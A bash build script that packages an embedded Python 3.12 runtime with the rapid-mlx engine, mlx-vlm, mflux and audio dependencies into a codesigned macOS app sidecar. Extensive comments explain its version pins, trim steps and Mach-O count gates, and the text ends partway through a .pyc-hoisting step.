#!/usr/bin/env bash
#
# build-sidecar.sh — produces the rapid-mlx sidecar artifact that
# rapid-desktop stages under Rapid.app/Contents/Resources/rapid-mlx/.
#
# Codifies the recipe validated by Phase 2 spike on 2026-06-13. See
# docs/sidecar-bundle-build.md for design + measurements.
#
# Lives in **rapid-desktop**, not vllm-mlx. Sidecar packaging is a
# rapid-desktop concern — tunables like MACHO_BASELINE_COUNT, extras
# (mlx-vlm, Pillow, mflux), trim rules, and size gates all gate a
# rapid-desktop artifact, so they live next to it. Submodule
# indirection used to put this script in the rapid-mlx repo (v0.6.6 →
# v0.7.7), and the v0.7.4 slim mechanism notes flagged that as a
# hidden landmine. Migrated to rapid-desktop in v0.7.8 (PR migrating
# scripts/build-sidecar.sh, scripts/sidecar-shim.sh,
# scripts/sidecar-entitlements.plist out of third_party/rapid-mlx).
#
# MONOREPO note: in this repo the rapid-mlx engine IS the repository
# root (apps/rapid-mac/ is a subdirectory of the engine). There is no
# git submodule — the pip-install source is the engine at the repo
# root. See ENGINE_ROOT / RAPID_MLX_SOURCE below.
#
# Usage:
#   scripts/build-sidecar.sh [--out OUT_DIR] [--developer-id ID]
#
#   --out OUT_DIR        Staging directory. Default: build/sidecar-stage
#   --developer-id ID    Apple Developer ID for codesigning. Default: -
#                        (adhoc — for local testing only; CI passes a
#                        real "Developer ID Application: <Team>".)
#   --skip-codesign      Skip the codesign sweep entirely (smoke tests).
#   --skip-verify        Skip the post-build smoke (no system Python
#                        guarantees) — for CI staging steps where the
#                        smoke runs in a separate job.
#
# Outputs:
#   $OUT_DIR/rapid-mlx/               # the bundle root
#   $OUT_DIR/rapid-mlx/bin/rapid-mlx  # entrypoint shim
#   $OUT_DIR/rapid-mlx/python/        # embedded python 3.12
#   $OUT_DIR/rapid-mlx/site-packages/ # rapid-mlx + deps
#   $OUT_DIR/rapid-mlx-sidecar.tar.gz # packaged artifact
#   $OUT_DIR/rapid-mlx-sidecar.sha256 # SHA-256 of the tarball
#
# Exit codes:
#   0 = success
#   1 = generic failure (build step error)
#   2 = Mach-O count mismatch (signing baseline drift)
#   3 = smoke test failure (bundle can't load mlx or import rapid-mlx)

set -euo pipefail

# ----- configuration ---------------------------------------------------

# Pin python-build-standalone to a known-signing-clean release. Bump
# carefully — every tag bump needs a re-run of the Phase 2 spike to
# confirm the .so / .dylib count is unchanged. The hardcoded baseline
# in MACHO_BASELINE_COUNT below depends on this version.
PBS_TAG="${PBS_TAG:-20260610}"
PBS_VERSION="${PBS_VERSION:-3.12.13}"
# compileall uses all cores by default. Restricted builders that cannot query
# process semaphore limits can set this to 1 without changing bundle contents.
COMPILEALL_JOBS="${COMPILEALL_JOBS:-0}"

# How many Mach-Os we expect to sign. A drift here means a new wheel
# added a .so OR a dependency moved a binary, both of which need
# re-baselining. Re-locked on the first authoritative CI run on
# GitHub-hosted macos-15 (run 27472544784) at 51 (the canonical "what
# actually ships" number — the original Phase 2 spike value of 77
# included build-time artifacts the strip step removes on a fresh
# runner). Re-locked again at 77 on 2026-06-18 after bundling Pillow
# alongside mlx-vlm in step 2.5: Pillow ships 8 `.cpython-312-darwin.so`
# modules (_avif, _imaging{,cms,ft,math,morph,tk}, _webp) + 18
# `.dylibs/` vendored libraries (libavif, libbrotli{common,dec},
# libfreetype, libharfbuzz, libjpeg, liblcms2, liblzma, libopenjp2,
# libpng16, libsharpyuv, libtiff, libwebp{,demux,mux}, libXau, libxcb,
# libz). All 26 new Mach-Os are standard well-formed Pillow-wheel
# binaries (same mechanism as mlx_metal / numpy / safetensors etc.
# already vendor) and codesign cleanly with the existing identity
# loop at the end of this script — no signing-safety spike re-run
# needed.
#
# Re-locked at 70 on 2026-07-21 (slim-down pass): step 3 now drops the
# orphaned Tcl/Tk runtime (tkinter's Python package was already stripped,
# so its 7 Mach-Os — libtcl9.0, libtcl9tk9.0, the itcl4.3.5 pair, the
# thread3.0.4 pair, and _tkinter.cpython-312-darwin.so — were unreachable
# dead weight). No signing-safety implication: we are REMOVING Mach-Os we
# used to sign, not adding new ones. The embedded-pip and numpy-tests
# trims in the same pass are pure-Python and Mach-O-neutral.
#
# Re-locked at 174 on 2026-08-10 after adding the bounded desktop Audio
# runtime (mlx-audio, SciPy's signal import closure, and libsndfile). This is
# the measured post-trim count from the pinned Python 3.12 bundle with both
# STT and Qwen3-TTS smoke imports passing. The non-Qwen TTS implementations
# and SciPy subpackages outside the signal closure have already been removed
# before this count is taken.
MACHO_BASELINE_COUNT="${MACHO_BASELINE_COUNT:-174}"
# Allow modest drift without blocking — wheel updates sometimes shift
# 1-2 .so files. Bigger drift means a new dependency, needs review.
# Kept at 5 across the 51 → 77 baseline rebase to give Pillow and
# mlx-vlm minor wheel releases a bit of headroom before tripping the
# gate (Pillow ships a longer .dylib chain than the original 51-file
# bundle, so a single dylib add/remove is a bigger proportional
# wobble than it used to be).
MACHO_TOLERANCE="${MACHO_TOLERANCE:-5}"

REPO_ROOT="$(cd "$(dirname "$0")/.." && pwd)"   # = apps/rapid-mac
# MONOREPO layout: the rapid-mlx engine IS the repository root, two
# levels up from apps/rapid-mac (this script lives at
# apps/rapid-mac/scripts/). We pip-install the sidecar directly from the
# in-tree engine — there is NO git submodule in this repo. The engine
# version we ship is therefore exactly what is checked out at the
# monorepo root for this commit, reviewable in the same PR diff (no
# separate submodule-pointer bump).
#
# The desktop repo used $REPO_ROOT/third_party/rapid-mlx here; that path
# no longer exists. Override RAPID_MLX_ENGINE_ROOT / RAPID_MLX_SOURCE for
# CI or dev layouts that put the engine somewhere else.
ENGINE_ROOT="${RAPID_MLX_ENGINE_ROOT:-$(cd "${REPO_ROOT}/../.." && pwd)}"
RAPID_MLX_SOURCE="${RAPID_MLX_SOURCE:-${ENGINE_ROOT}}"
OUT_DIR="${OUT_DIR:-${REPO_ROOT}/build/sidecar-stage}"
DEVELOPER_ID="${DEVELOPER_ID:--}"
SKIP_CODESIGN=0
SKIP_VERIFY=0

while [ $# -gt 0 ]; do
    case "$1" in
        --out) OUT_DIR="$2"; shift 2 ;;
        --developer-id) DEVELOPER_ID="$2"; shift 2 ;;
        --skip-codesign) SKIP_CODESIGN=1; shift ;;
        --skip-verify) SKIP_VERIFY=1; shift ;;
        -h|--help)
            sed -n '2,32p' "$0"
            exit 0
            ;;
        *) echo "unknown arg: $1" >&2; exit 1 ;;
    esac
done

STAGE="${OUT_DIR}/rapid-mlx"
ENTITLEMENTS="${REPO_ROOT}/scripts/sidecar-entitlements.plist"

# ----- preflight -------------------------------------------------------

require() {
    command -v "$1" > /dev/null 2>&1 || {
        echo "ERR: missing required binary: $1" >&2
        exit 1
    }
}

require curl
require tar
require codesign
require shasum

if [ ! -f "$ENTITLEMENTS" ] && [ "$SKIP_CODESIGN" != "1" ]; then
    echo "ERR: entitlements file missing at $ENTITLEMENTS" >&2
    exit 1
fi

ARCH="$(uname -m)"
if [ "$ARCH" != "arm64" ]; then
    echo "ERR: sidecar is arm64-only (mlx requires Apple Silicon); got $ARCH" >&2
    exit 1
fi

mkdir -p "$OUT_DIR"
# Resolve to absolute so paths derived from $OUT_DIR survive the
# `cd "$OUT_DIR"` we do later when invoking tar — otherwise a relative
# `--out build/sidecar-stage` (CI passes this) makes tar look for
# `./build/sidecar-stage/rapid-mlx-sidecar.tar.gz` from inside its own
# target directory and fail with "no such file or directory".
OUT_DIR="$(cd "$OUT_DIR" && pwd)"

# Belt-and-suspenders (codex r3 N5): if the absolutise step above ever
# silently produced an empty OUT_DIR (impossible under set -e for the
# realistic failure modes, but the consequence of getting it wrong is
# `rm -rf "/rapid-mlx"` two lines down — same family as the famous
# Steam shell-script bug). Guard explicitly.
if [ -z "$OUT_DIR" ] || [ ! -d "$OUT_DIR" ]; then
    echo "ERR: OUT_DIR resolution produced an invalid path: '$OUT_DIR'" >&2
    exit 1
fi

STAGE="${OUT_DIR}/rapid-mlx"

rm -rf "$STAGE"
mkdir -p "$STAGE/bin"

# ----- step 1: embedded python interpreter -----------------------------

PBS_URL="https://github.com/astral-sh/python-build-standalone/releases/download/${PBS_TAG}/cpython-${PBS_VERSION}+${PBS_TAG}-aarch64-apple-darwin-install_only_stripped.tar.gz"
PBS_TAR="/tmp/rapid-pbs-${PBS_TAG}.tar.gz"
PBS_TAR_TMP="${PBS_TAR}.tmp"

# Never trust a cache entry that cannot be listed as a gzip tarball. A failed
# transfer from an older build may have written only part of the archive.
if [ -f "$PBS_TAR" ] && ! tar -tzf "$PBS_TAR" > /dev/null 2>&1; then
    echo "warning: discarding incomplete python-build-standalone cache" >&2
    rm -f "$PBS_TAR"
fi
if [ ! -f "$PBS_TAR" ]; then
    echo "==> downloading python-build-standalone $PBS_VERSION ($PBS_TAG)"
    rm -f "$PBS_TAR_TMP"
    if ! curl --http1.1 -fsSL \
        --retry 5 --retry-delay 2 --retry-all-errors \
        -o "$PBS_TAR_TMP" "$PBS_URL"; then
        rm -f "$PBS_TAR_TMP"
        exit 1
    fi
    if ! tar -tzf "$PBS_TAR_TMP" > /dev/null 2>&1; then
        echo "ERR: downloaded python-build-standalone archive is invalid" >&2
        rm -f "$PBS_TAR_TMP"
        exit 1
    fi
    mv "$PBS_TAR_TMP" "$PBS_TAR"
fi
echo "==> extracting python interpreter"
tar -xzf "$PBS_TAR" -C "$STAGE"
test -x "$STAGE/python/bin/python3.12" \
    || { echo "ERR: extracted python is missing executable" >&2; exit 1; }

# ----- step 2: install rapid-mlx + runtime deps ------------------------

echo "==> installing rapid-mlx into site-packages (no [vision] extras)"
if [ ! -d "$RAPID_MLX_SOURCE" ] || [ ! -f "$RAPID_MLX_SOURCE/pyproject.toml" ]; then
    echo "ERR: rapid-mlx engine source tree missing at: $RAPID_MLX_SOURCE" >&2
    echo "     In the monorepo the engine is the repository root (two levels" >&2
    echo "     up from apps/rapid-mac). If you copied apps/rapid-mac out of the" >&2
    echo "     monorepo, set RAPID_MLX_SOURCE (or RAPID_MLX_ENGINE_ROOT) to a" >&2
    echo "     checkout of the rapid-mlx engine." >&2
    exit 1
fi
# Drive dependency resolution with the pinned interpreter extracted above.
# Its pip is present during assembly and stripped only after both installs,
# keeping wheel selection tied to the exact ABI that ships in the bundle.
#
# transformers upper-bound pin (release-blocker, v0.8.20): rapid-mlx pulls
# transformers transitively via mlx-lm (0.31.3 → `transformers>=5.0.0`) and
# mlx-vlm (0.6.3 → `transformers>=5.5.0`), neither of which caps the upper
# bound. transformers 5.13.0 tightened `AutoTokenizer.register` to deref
# `key.__module__`, but mlx-lm 0.31.3 registers tokenizers with *string*
# class names (mlx_lm/tokenizer_utils.py:505), so a fresh resolve to 5.13.0
# throws `AttributeError: 'str' object has no attribute '__module__'` at
# `import mlx_vlm` → every gemma-4 / DiffusionGemma launch would crash. The
# CI sidecar smoke (step 6) caught it. 5.5.0–5.12.x import cleanly (pip
# currently resolves 5.12.1); <5.13 is the working range. Passing the
# constraint as a top-level requirement makes
# pip's resolver honor it for the transitive dep too. Revisit when mlx-lm /
# mlx-vlm or transformers ship a compatible fix (tracked upstream in rapid-mlx).
"$STAGE/python/bin/python3.12" -m pip install \
    --target "$STAGE/site-packages" \
    --no-warn-script-location \
    --no-compile \
    --upgrade \
    "${RAPID_MLX_SOURCE}[audio-desktop]" \
    'mlx==0.32.2' \
    'transformers==5.12.1'

# pip normally selects wheels for the BUILD host. A sidecar assembled on
# macOS 26 therefore receives mlx / mlx-metal's macosx_26 wheels even though
# the Desktop app's deployment target is macOS 14. Moving that otherwise
# valid app to a macOS 14/15 Mac then fails at the first Metal operation with
# "metallib language version 4.0 is not supported on this OS". Reinstall the
# exact versions selected above from their macOS 14 wheels: those wheels run
# on newer systems too, making the packaged runtime match the app contract.
MLX_VERSION="$(PYTHONPATH="$STAGE/site-packages" \
    "$STAGE/python/bin/python3.12" -c \
    'from importlib.metadata import version; print(version("mlx"))')"
MLX_METAL_VERSION="$(PYTHONPATH="$STAGE/site-packages" \
    "$STAGE/python/bin/python3.12" -c \
    'from importlib.metadata import version; print(version("mlx-metal"))')"
echo "==> pinning MLX wheels to Desktop's macOS 14 deployment target"
"$STAGE/python/bin/python3.12" -m pip install \
    --target "$STAGE/site-packages" \
    --platform macosx_14_0_arm64 \
    --only-binary=:all: \
    --no-warn-script-location \
    --no-compile \
    --no-deps \
    --upgrade \
    --force-reinstall \
    "mlx==${MLX_VERSION}" \
    "mlx-metal==${MLX_METAL_VERSION}"

for wheel in \
    "$STAGE/site-packages/mlx-${MLX_VERSION}.dist-info/WHEEL" \
    "$STAGE/site-packages/mlx_metal-${MLX_METAL_VERSION}.dist-info/WHEEL"; do
    grep -q '^Tag: .*macosx_14_0_arm64$' "$wheel" || {
        echo "ERR: Desktop sidecar resolved a non-macOS-14 MLX wheel: $wheel" >&2
        exit 1
    }
done

# ----- step 2.5: bundle mlx-vlm --no-deps + Pillow ---------------------
#
# Even though we skip the [vision] extras to stay under rapid-desktop's
# 500 MB CI gate, the gemma-4 family (12 aliases on the curated
# catalog — gemma-4-12b-4bit, -12b-qat-4bit/8bit, -26b-4bit,
# -26b-qat-4bit, -31b-{4,8}bit, -31b-qat-{4,8}bit, and friends) NEEDS
# the ``mlx_vlm.models.gemma4_unified`` architecture classes to load,
# even in text-only mode. v0.7.7 shipped without this and every
# gemma-4 server start crashed with::
#
#     ImportError: Gemma 4 models require the optional
#         `mlx-vlm` dependency for the model architecture classes.
#
# ``--no-deps`` keeps the mlx-vlm install at ~9 MB (just the Python
# classes) instead of pulling torch + cv2 + torchvision (~322 MB
# cascade) the way ``[vision]`` extras would. mlx-vlm's __init__.py
# eagerly chains ``from .convert import convert`` → ``.utils`` → ``PIL``,
# so ``import mlx_vlm`` fails without Pillow even on the text-only
# path. All other eager deps (transformers, requests, huggingface_hub,
# safetensors, numpy, mlx) are already bundled by rapid-mlx's own
# install above, so Pillow is the only additional dep we need.
# Pin exactly: this install deliberately uses --no-deps, so a range would let
# the desktop silently float to an mlx-vlm release whose declared transformers
# requirement conflicts with the engine's validated <5.13 cap (#1501).
echo "==> bundling mlx-vlm --no-deps + Pillow (gemma-4 + DiffusionGemma loader path)"
"$STAGE/python/bin/python3.12" -m pip install \
    --target "$STAGE/site-packages" \
    --no-warn-script-location \
    --no-compile \
    --no-deps \
    'mlx-vlm==0.6.16' \
    'Pillow>=10.0'

# ----- step 2.6: bundle mflux --no-deps (Images tab image-gen lane) ----
#
# The Images tab offers flux2-klein-4b for generation + editing and
# z-image-turbo for generation. ``ImageGenViewModel`` starts the sidecar on
# whichever one the user picked. Without mflux the sidecar prints
# "image generation requires the `rapid-mlx[image]` Python extra" and
# exits before binding a port, so the app can only say "Couldn't start X.
# Try again" — advice that fails identically forever, after a 4-6 GB
# download. That is precisely the dead end #1603 closed for the video
# aliases, and it shipped unnoticed because the Images golden flow drives
# a stub server and so cannot observe a missing engine dependency.
#
# mflux declares torch (363 MB installed), opencv-python and matplotlib.
# Bundling torch alone would blow BUNDLE_SIZE_CAP_MB (500) on its own, and
# none of the three is reachable from the two families we wire:
#   * every component of Flux2KleinWeightDefinition / ZImageWeightDefinition
#     takes ComponentDefinition's default ``loading_mode="mlx_native"``,
#     which loads through ``mx.load``;
#   * torch is only touched by the "torch_checkpoint" / "torch_convert" /
#     "torch_bfloat16" modes, which belong to families we do not wire
#     (fibo, fibo_vlm, depth_pro);
#   * cv2 lives in flux/variants/controlnet and matplotlib in
#     flux/variants/concept_attention — neither on our path.
# The only thing in the way is a module-level ``import torch`` in
# weight_loader.py that runs on EVERY load; the patch below defers it into
# the three functions that actually use it. Verified end to end on a
# bundle with no torch: ``serve flux2-klein-4b`` binds, and
# /v1/images/generations returns a real 512x512 PNG in ~3 s on an M3 Ultra.
#
# Of mflux's other declared deps only three are both missing here and
# actually imported: platformdirs (cli/defaults/defaults.py, reached from
# weight_loader), piexif (utils/image_util.py) and toml
# (utils/version_util.py) — ~620 KB together. filelock is already bundled
# by rapid-mlx's own install; hf-transfer is declared but never imported.
# Pin exactly, for the same reason as mlx-vlm above: with --no-deps a range
# would let the desktop float onto an mflux release whose loader wants a
# dependency this bundle does not carry.
echo "==> bundling mflux --no-deps + platformdirs/piexif/toml (Images tab image-gen lane)"
"$STAGE/python/bin/python3.12" -m pip install \
    --target "$STAGE/site-packages" \
    --no-warn-script-location \
    --no-compile \
    --no-deps \
    'mflux==0.19.0' \
    'platformdirs>=4.0,<5.0' \
    'piexif>=1.1.3,<2.0' \
    'toml>=0.10.2,<1.0'

# Defer mflux's module-level torch imports into the three functions that
# use them. Fails the build when the expected lines are gone: an mflux bump
# that reshapes weight_loader.py must be re-verified by a human rather than
# silently shipping an Images tab that dies on every generation.
"$STAGE/python/bin/python3.12" - "$STAGE/site-packages" <<'PY'
import pathlib
import re
import sys

target = pathlib.Path(sys.argv[1]) / "mflux/models/common/weights/loading/weight_loader.py"
src = target.read_text()

for eager in ("import torch\n", "from safetensors.torch import load_file as torch_load_file\n"):
    if eager not in src:
        raise SystemExit(
            f"ERR: mflux weight_loader.py no longer has the eager import "
            f"{eager.strip()!r}. Re-verify the torch-free image path before "
            f"bumping the mflux pin."
        )
    src = src.replace(eager, "", 1)

lazy = (
    "        import torch\n"
    "        from safetensors.torch import load_file as torch_load_file\n"
)
for fn in ("_load_torch_checkpoint", "_load_torch_convert", "_load_torch_bfloat16"):
    match = re.search(rf"^    def {fn}\(.*\n", src, re.M)
    if match is None or not match.group(0).rstrip().endswith(":"):
        raise SystemExit(
            f"ERR: mflux weight_loader.py has no single-line def for {fn}(). "
            f"Re-verify the torch-free image path before bumping the mflux pin."
        )
    src = src[: match.end()] + lazy + src[match.end() :]

target.write_text(src)
print("==> mflux torch imports deferred into the 3 torch-only loading modes")
PY

# mflux 0.19.0's PiD checkpoint converter is imported transitively by every
# Qwen Image model even though it is only used for the separate PiD upscaler.
# Keep that optional PyTorch conversion path lazy too, otherwise selecting the
# bundled qwen-image alias fails before model construction with
# ``ModuleNotFoundError: No module named 'torch'``.
"$STAGE/python/bin/python3.12" - "$STAGE/site-packages" <<'PY'
import pathlib
import sys

target = pathlib.Path(sys.argv[1]) / "mflux/models/common/pid_decoder/pid_weight_mapping.py"
src = target.read_text()
eager = "import torch\n"
functions = (
    "def convert_checkpoint(pth_path: str) -> dict[str, mx.array]:\n",
    "def _to_mx_array(tensor: torch.Tensor) -> mx.array:\n",
)
if src.count(eager) != 1 or any(src.count(function) != 1 for function in functions):
    raise SystemExit(
        "ERR: mflux PiD weight mapping changed. Re-verify the torch-free "
        "qwen-image path before bumping the mflux pin."
    )
src = src.replace(eager, "", 1)
for function in functions:
    replacement = function.replace("tensor: torch.Tensor", "tensor")
    src = src.replace(function, replacement + '    import torch\n', 1)
target.write_text(src)
print("==> mflux PiD torch import deferred behind checkpoint conversion")
PY

# Fail closed: with no torch in the stage, importing mflux's weight loader
# is itself the proof that the image lane no longer needs a 363 MB
# dependency. A regression here means every Images-tab generation 500s.
PYTHONPATH="$STAGE/site-packages" PYTHONNOUSERSITE=1 "$STAGE/python/bin/python3.12" -s - <<'PY'
import importlib
import sys

importlib.import_module("mflux.models.common.weights.loading.weight_loader")
importlib.import_module("mflux.models.qwen.variants.txt2img.qwen_image")
if "torch" in sys.modules:
    raise SystemExit("ERR: mflux still pulls torch at import time")
print("==> mflux image lane imports without torch: OK")
PY

# ``--no-deps`` is intentional for bundle size, but it must not hide version
# conflicts among distributions that ARE present. Missing optional heavy deps
# remain allowed; every installed-to-installed edge must satisfy its metadata.
PYTHONPATH="$STAGE/site-packages" PYTHONNOUSERSITE=1 \
    "$STAGE/python/bin/python3.12" -s \
    "$REPO_ROOT/scripts/check-sidecar-distributions.py" \
    "$STAGE/site-packages"

# ----- step 3: strip dev / unused artifacts ----------------------------

echo "==> stripping dev artifacts"
rm -rf \
    "$STAGE/site-packages/pip" \
    "$STAGE/site-packages/pip-"*.dist-info \
    "$STAGE/site-packages/bin" \
    "$STAGE/site-packages/mlx/include" \
    "$STAGE/site-packages/mlx/lib/cmake"
rm -rf \
    "$STAGE/python/lib/python3.12/ensurepip" \
    "$STAGE/python/lib/python3.12/idlelib" \
    "$STAGE/python/lib/python3.12/turtledemo" \
    "$STAGE/python/lib/python3.12/tkinter" \
    "$STAGE/python/lib/python3.12/test" \
    "$STAGE/python/include" \
    "$STAGE/python/share/man"
# The embedded python ships a full pip in its OWN site-packages
# (python/lib/.../site-packages/pip, ~12 MB) — distinct from the
# rapid-mlx site-packages/pip stripped above. Nothing at runtime pip-
# installs from the bundle; build-time installs are complete before this
# point and ensurepip is removed just above, so this is pure dead weight.
rm -rf \
    "$STAGE/python/lib/python3.12/site-packages/pip" \
    "$STAGE/python/lib/python3.12/site-packages/pip-"*.dist-info
# Drop the orphaned Tcl/Tk runtime. tkinter's Python package was removed
# just above, so the Tcl/Tk script libraries + dylibs + the _tkinter C
# extension are unreachable (nothing else in the bundle links Tcl/Tk —
# mlx / numpy / PIL.ImageTk all route through tkinter). ~10 MB + 7
# Mach-Os; MACHO_BASELINE_COUNT above is set to the post-trim count.
rm -rf \
    "$STAGE/python/lib/"libtcl*.dylib \
    "$STAGE/python/lib/"libtk*.dylib \
    "$STAGE/python/lib/"tcl* \
    "$STAGE/python/lib/"tk* \
    "$STAGE/python/lib/"thread* \
    "$STAGE/python/lib/"itcl* \
    "$STAGE/python/lib/python3.12/lib-dynload/"_tkinter*.so
find "$STAGE" -type d -name __pycache__ -prune -exec rm -rf {} +

# ----- step 3.5: aggressive trim (post-strip, pre-compileall) ----------
#
# rapid-desktop's `.app` bundle hit 858 MB (machinefi/rapid-desktop#242
# CI gate caps at 500 MB). The sidecar contributes ~498 MB raw; this
# step trims ~80 MB of code we never load at runtime.
#
# Two safe drops:
#   1. transformers/models/*/modeling_*.py — our inference path goes
#      through mlx-lm's own model classes; we never instantiate
#      transformers' AutoModel/PreTrainedModel. The bundle also has
#      no PyTorch (`torch` not installed), so transformers' lazy
#      `from transformers import AutoModel` already returns a
#      "PyTorch was not found" placeholder — third parties calling
#      `AutoModel.from_pretrained(...)` against this sidecar hit
#      the placeholder error path long before any missing-module
#      lookup, so deleting modeling_*.py is a no-op for the
#      already-broken AutoModel surface. We DO still need the
#      tokenizer + config dispatch in transformers/models/auto/, so
#      that path is pruned out of the find.
#   2. image_processing_*.py + feature_extraction_*.py — historically
#      treated as text-only-sidecar dead code. NO LONGER TRUE: as of
#      v0.7.41 the bundled rapid-mlx ships multimodal aliases
#      (gemma-3n-e2b-4bit, gemma-3n-e4b-4bit, qwen3-vl-2b-4bit, ...)
#      that route through mlx-vlm, and mlx-vlm DOES instantiate the
#      transformers processor / feature-extractor for those families.
#
# rapid-desktop#312 (v0.7.17 P0): the unconditional trim deleted
# transformers/models/gemma3n/feature_extraction_gemma3n.py and
# transformers/models/gemma3n/modeling_gemma3n.py; first boot of
# `rapid-mlx serve gemma-3n-e2b-4bit` crashed with
# `ValueError: Could not find Gemma3nAudioFeatureExtractor` and
# `Application startup failed`. Same shape for qwen3-vl.
#
# Fix: build an allowlist of transformers/models/<dir>/ subtrees to
# PRESERVE at trim time by enumerating mlx-vlm's bundled model dirs
# at $STAGE/site-packages/mlx_vlm/models/. Any transformers/models/
# subdir whose basename matches an mlx-vlm model dir is held back
# from both deletes. The allowlist is regenerated each build, so
# a future v0.7.42 that adds another VLM family to mlx-vlm
# automatically picks up the new dir with no script edit.
#
# Edge cases handled below:
#   * mlx-vlm not bundled (text-only build) → VLM_DIRS empty → the
#     find behaviour is identical to the pre-#312 version.
#   * mlx-vlm dir name with no matching transformers/models/<dir>/ →
#     -path prune is a no-op for that name, no harm.
#   * step 3.6 .pyc hoist (below) already skips
#     transformers/models/* via `-not -path "*/transformers/models/*"`,
#     so the preserved .py files stay in source form and the
#     transformers lazy import_structure registry still finds them.
#
# The desktop STT lane also needs WhisperFeatureExtractor. mlx-community's
# MLX Whisper checkpoints intentionally contain weights/config only, so
# STTEngine attaches a WhisperProcessor from the matching openai/whisper-*
# repo. Deleting feature_extraction_whisper.py makes that processor fail even
# when all of its config/tokenizer files are available. Preserve this single
# audio implementation without retaining every transformers audio family.

echo "==> building multimodal trim allowlist from mlx-vlm bundled models"
VLM_DIRS=()
if [ -d "$STAGE/site-packages/mlx_vlm/models" ]; then
    while IFS= read -r d; do
        VLM_DIRS+=("$(basename "$d")")
    done < <(find "$STAGE/site-packages/mlx_vlm/models" \
        -mindepth 1 -maxdepth 1 -type d -not -name "__pycache__")
fi
echo "==> mlx-vlm bundled model dirs: ${#VLM_DIRS[@]}"

# Compose the find -path ... -prune args once. Each preserved dir
# contributes ` -o -path "*/transformers/models/<dir>/*" -prune` so the
# two finds below both honour the allowlist. `auto/` stays pruned for
# the same reason as before (tokenizer/config dispatch we DO need).
#
# Note on array under `set -u`: the script enables `set -u` at top.
# `"${VLM_DIRS[@]}"` with an empty array would trip nounset on bash
# < 4.4 (macos system bash is 3.2, but the CI runner + dev shells we
# care about use bash 5+). We guard the expansion with the
# `${#VLM_DIRS[@]}` length check so the empty-array branch never
# touches `${VLM_DIRS[@]}`.
PRUNE_ARGS=( -path "*/auto/*" -prune )
if (( ${#VLM_DIRS[@]} > 0 )); then
    for v in "${VLM_DIRS[@]}"; do
        PRUNE_ARGS+=( -o -path "*/transformers/models/$v/*" -prune )
    done
fi

echo "==> trimming transformers PyTorch model implementations (preserving multimodal allowlist)"
find "$STAGE/site-packages/transformers/models" \
    "${PRUNE_ARGS[@]}" -o \
    -name "modeling_*.py" -not -name "modeling_tf_*" -not -name "modeling_flax_*" \
    -print -delete
find "$STAGE/site-packages/transformers/models" \
    "${PRUNE_ARGS[@]}" -o \
    \( -name "image_processing_*.py" -o -name "feature_extraction_*.py" \) \
    -not -path "*/transformers/models/whisper/feature_extraction_whisper.py" \
    -print -delete

echo "==> trimming numpy dev/test detritus"
rm -rf \
    "$STAGE/site-packages/numpy/random/_examples" 2>/dev/null || true
# Sweep every numpy `tests/` package (~9 MB across _core, lib, ma,
# random, linalg, polynomial, matrixlib, fft, testing, typing, f2py,
# distutils). numpy never imports its own test suites at runtime, and
# they carry no Mach-Os (verified: pure .py + data fixtures).
find "$STAGE/site-packages/numpy" -type d -name tests -prune -exec rm -rf {} + 2>/dev/null || true

# Audio adds SciPy and mlx-audio, whose wheels include ~23 MB of their own
# unit suites. Runtime never imports those suites. Keep
# numpy.testing._private.extbuild above, however: SciPy 1.18's Array API
# compatibility bootstrap clones NumPy's public attributes and imports
# numpy.testing while `from scipy import signal` initializes.
find "$STAGE/site-packages/scipy" -type d -name tests -prune -exec rm -rf {} + 2>/dev/null || true
find "$STAGE/site-packages/mlx_audio" -type d -name tests -prune -exec rm -rf {} + 2>/dev/null || true

# The desktop Audio surface uses scipy.signal for input resampling. Speech WAV
# output uses the standard-library `wave` writer, so scipy.io is not required.
# SciPy's
# signal import closure covers _lib/_external plus constants, fft, integrate,
# interpolate, linalg, ndimage, optimize, sparse, spatial, special, and stats;
# the subpackages below remain outside that closure (verified in the bundled
# interpreter) and are not referenced anywhere in mlx_audio. Removing them
# saves several MB and their native extensions while keeping the resampler
# under the build smoke below.
rm -rf \
    "$STAGE/site-packages/scipy/cluster" \
    "$STAGE/site-packages/scipy/datasets" \
    "$STAGE/site-packages/scipy/differentiate" \
    "$STAGE/site-packages/scipy/fftpack" \
    "$STAGE/site-packages/scipy/io" \
    "$STAGE/site-packages/scipy/misc" \
    "$STAGE/site-packages/scipy/odr"

# mlx-audio ships implementations for dozens of TTS families. The desktop
# picker deliberately exposes only Qwen3 CustomVoice: it offers real named
# preset speakers without the large Kokoro G2P or F5 cloning dependency
# stacks. Drop the other family implementations so the release stays below
# the app's 500 MiB envelope; shared TTS utilities and Qwen3's codec modules
# remain intact.
if [ -d "$STAGE/site-packages/mlx_audio/tts/models" ]; then
    find "$STAGE/site-packages/mlx_audio/tts/models" \
        -mindepth 1 -maxdepth 1 -type d \
        -not -name qwen3_tts -not -name __pycache__ \
        -prune -exec rm -rf {} +
fi

# Pre-compile every .py in the bundled stdlib + site-packages BEFORE
# we codesign. Otherwise CPython's import machinery writes .pyc files
# into __pycache__/ at runtime on first use, those additions are
# unsealed (codesign --verify --deep reports "a sealed resource is
# missing or invalid"), and any `spctl --assess` after first launch
# rejects the bundle:
#
#   * Migration Assistant copy to a new Mac → first launch fails
#     "App is damaged, move to Trash".
#   * macOS major upgrade re-evaluates Gatekeeper → same.
#   * User moves /Applications/Rapid-MLX Desktop.app and back → same.
#
# rapid-desktop issue #230 — confirmed in v0.6.14 with 1008 stray
# .pyc files post-launch. Notarisation is unaffected (the ticket lives
# in xattr metadata, not the sealed resource directory), only the
# spctl-assess re-check path.
#
# SOURCE_DATE_EPOCH freezes the .pyc magic-number timestamp so builds
# stay byte-reproducible — without it every CI re-run produces a
# different bundle and the upstream `MACHO_BASELINE_COUNT` drift
# heuristic becomes meaningless. Falls back to 0 when the build runs
# outside a git checkout (smoke test fixtures).
SOURCE_DATE_EPOCH="${SOURCE_DATE_EPOCH:-$(git -C "$REPO_ROOT" log -1 --format=%ct HEAD 2>/dev/null || echo 0)}"
export SOURCE_DATE_EPOCH
echo "==> pre-compiling .pyc cache (SOURCE_DATE_EPOCH=$SOURCE_DATE_EPOCH)"
"$STAGE/python/bin/python3.12" -m compileall -q -f -j "$COMPILEALL_JOBS" \
    "$STAGE/python/lib/python3.12" \
    "$STAGE/site-packages" \
    || { echo "ERR: compileall failed; bundle would seal-break on first launch" >&2; exit 1; }

# ----- step 3.6: drop .py sources in site-packages, hoist .pyc ---------
#
# Scope: site-packages only. The bundled stdlib under
# $STAGE/python/lib/python3.12/ is left in source form on purpose — the
# stdlib is only ~30 MB on disk after the step-3 strip, and its
# __pycache__/ entries are already populated by the compileall step
# above so import latency is identical either way.
#
